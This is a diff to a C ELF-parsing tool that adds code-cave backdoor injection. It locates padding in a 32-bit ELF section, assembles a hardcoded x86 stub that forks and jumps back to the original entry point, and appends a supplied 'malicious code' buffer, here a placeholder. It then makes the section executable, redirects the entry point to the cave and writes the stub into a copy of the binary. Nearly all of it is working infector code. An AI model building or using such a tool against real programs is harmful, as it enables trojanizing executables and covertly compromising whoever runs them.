@@ -5,6 +5,9 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 
+#define DEBUG1
+//#define DEBUG2
+
 // Prototypes
 
 char *findLongestCave(char *codeSec, int secSize, int *codecaveSize);
@@ -210,6 +213,77 @@ char *extractCodeSection(int32_t fd, Elf32_Ehdr eh, Elf32_Shdr sh_table[], int *
 	return codeBuffer;
 }
 
+struct x86ByteInstruction
+{
+	char opcode;
+	char additionalSize;
+	char additionalCode[4];
+} typedef x86ByteInstruction;
+
+// NOP Instruction
+x86ByteInstruction stubInst;
+
+x86ByteInstruction assembleJMPInstruction(int offset){
+	x86ByteInstruction opcode;
+
+	// Jmp opcode
+	opcode.opcode = '\xE9';
+	opcode.additionalSize = 4;
+	int range;
+
+	if(offset >= 4){
+		range = offset - 4;
+	}
+	else if(offset < 0){
+		range = offset - 4;
+	}
+	else{
+		errno = 1;
+		return stubInst;
+	}
+
+	memcpy(opcode.additionalCode, &range, sizeof(int));
+	return opcode;
+}
+
+char *generateBackdoorCode(char startCode[4], char *maliciousCode, int maliciousCodeSize, int *newSize) {
+	char *template = "\x31\xc0\x40\x40\xcd\x80\x85\xc0\x74\x07\xbd\x44\x43\x42\x41\xff\xe5\x90\x90\x90\x90";
+	const int stubSize = 4;
+	char startCodeRev[4];
+	
+	// Reverse startCode address
+	for(int i = 0; i < 4; i++){
+		startCodeRev[i] = startCode[4 - i - 1];
+	}
+
+	int bufSize = strlen(template) - stubSize + maliciousCodeSize;
+	char *buffer = (char *)malloc(bufSize);
+
+	// Copy template
+	memset(buffer, 0x90, bufSize);
+	memcpy(buffer, template, strlen(template));
+
+	// Inject start code
+	char *fakeAddrPtr = strstr(buffer, "\x44\x43\x42\x41");
+	memcpy(fakeAddrPtr, startCodeRev, 4);
+
+	// Inject start code
+	char *stubPtr = strstr(buffer, "\x90\x90\x90\x90");
+	memcpy(stubPtr, maliciousCode, maliciousCodeSize);
+
+	*newSize = bufSize;
+	return buffer;
+}
+
+int calcCaveVirtualAddress(codecave *cave, int32_t fd, Elf32_Ehdr eh, Elf32_Shdr sh_table[]){
+	Elf32_Shdr *currentSection = findSectionByName(cave->secName, fd, eh, sh_table);
+
+	// Integer overflow
+	int caveOffset = (unsigned long)(cave->physicalOffset) - (unsigned long)(currentSection->sh_offset);
+
+	return currentSection->sh_addr + caveOffset;
+}
+
 char *findLongestCave(char *codeSec, int secSize, int *codecaveSize){
 	static const int MIN_LENGTH = 9;
 
@@ -308,7 +382,7 @@ int32_t main(int32_t argc, char *argv[])
 		disassemble64(fd, eh64, sh_tbl);
 
 	} else{
-		Elf32_Shdr* sh_tbl;	/* section-header table is variable size */
+		Elf32_Shdr *sh_tbl;	/* section-header table is variable size */
 		print_elf_header(eh);
 
 		/* Section header table :  */
@@ -325,6 +399,7 @@ int32_t main(int32_t argc, char *argv[])
 		puts("END");
 
 		char *patchName = getPatchedName(argv[1]);
+		printf("Pathced name = %s\n", patchName);
 		duplicateFile(argv[1], patchName);
 		int patchFD = open(patchName, O_RDWR);
 		
@@ -346,16 +421,55 @@ int32_t main(int32_t argc, char *argv[])
 
 		printf("Caves found: %d\n", cavesNum);
 
-		if (cavesNum > 0){
-			/*for(int i = 0; i < cavesNum; i++){
-				codecave cave = caves[i];
-			}*/
+		if (cavesNum > 0) codecave_summary(caves, cavesNum);
 
-			codecave_summary(caves, cavesNum);
+		codecave *winner = getWinnerCodecave(caves, cavesNum);
 
+		// Generating malicious code
+		int newEntryPointSize;
+		char *malEntryPointCode = generateBackdoorCode("\x41\x42\x43\x44", "\x90\x90\x90\x90\xcc", 5, &newEntryPointSize);
+
+		if(newEntryPointSize > winner->length) {
+			puts("Code injection isn't possible!");
+			exit(1);
 		}
 
+		// Make the winner section executable
+		makeSectionExecutable(winner->secName, patchFD, eh, sh_tbl);
+
+		// Change entry point to new cave
+		eh.e_entry = calcCaveVirtualAddress(winner, patchFD, eh, sh_tbl);
+		writeFileHeader(patchFD, &eh);
+
+		printf("HEXDUMP: %x %x %x %x\n", malEntryPointCode[0], malEntryPointCode[1], malEntryPointCode[2], malEntryPointCode[3]);
+
+		// Write malicious code to code cave
+		lseek(patchFD, (off_t)winner->physicalOffset, SEEK_SET);
+		write(patchFD, (void *)malEntryPointCode, newEntryPointSize);
+
+		printf("entrypoint = 0x%x\n", eh.e_entry);
+
 		// TODO: Make this copy the org file and only change the fields instead of copynig individualy
+
+		// < ========  CAVE CODE END  ======== >
+
+		#ifdef DEBUG2
+		x86ByteInstruction inst = assembleJMPInstruction(-2074839463);
+		if(errno != 1){
+			puts("AAAA");
+			//write(1, inst.additionalCode, 4);
+			int fff = open("test", O_CREAT | O_RDWR);
+			write(fff, inst.additionalCode, inst.additionalSize);
+			close(fff);
+			puts("AAAA");
+		}
+		#else
+		if (errno != 0){
+			exit(errno);
+		}
+		#endif
+
+
 		exit(0);
 
 
